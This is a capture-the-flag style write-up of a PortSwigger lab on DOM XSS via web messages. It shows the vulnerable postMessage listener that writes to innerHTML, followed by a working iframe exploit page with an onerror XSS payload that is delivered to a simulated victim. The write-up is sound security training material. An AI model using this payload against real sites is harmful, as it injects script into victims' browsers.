# DOM XSS using web messages

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages), you'll learn: DOM XSS using web messages! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the `print()` function to be called.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-1/images/Pasted%20image%2020230114163506.png)

**View source page:**
```html
[...]
<!-- Ads to be inserted here -->
<div id='ads'>
</div>
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
[...]
```

In this web message, it's vulnerable to DOM-based XSS, as **it doesn't verify the origin of incoming messages correctly** in the event listener, properties and functions that are called by the event listener.

Also, we can also see a sink (Dangerous function): `innerHTML`. It allows us to write HTML code to the `<div id='id'>` element.

Armed with above information, we can host a malicious HTML file that contains `<iframe>` element and use the `postMessage()` method to pass web message data to the vulnerable event listener, which then sends the payload to a sink on the parent page:

```html
<html>
    <head>
        <title>DOM XSS using web messages</title>
    </head>
    <body>
        <iframe src="https://0a0d00b0047cf0cfc0d6f9b900b100b5.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=errorpls onerror=print()>','*');"></iframe>
    </body>
</html>
```

As the event listener does not verify the origin of the message, and the `postMessage()` method specifies the `targetOrigin` `"*"`, the event listener accepts the payload and passes it into the `innerHTML` sink.

Let's go to the exploit server to host the payload, and test it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-1/images/Pasted%20image%2020230114164531.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-1/images/Pasted%20image%2020230114164540.png)

It worked! Let's deliver the payload to victim:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-1/images/Pasted%20image%2020230114164603.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-1/images/Pasted%20image%2020230114164608.png)

# What we've learned:

1. DOM XSS using web messages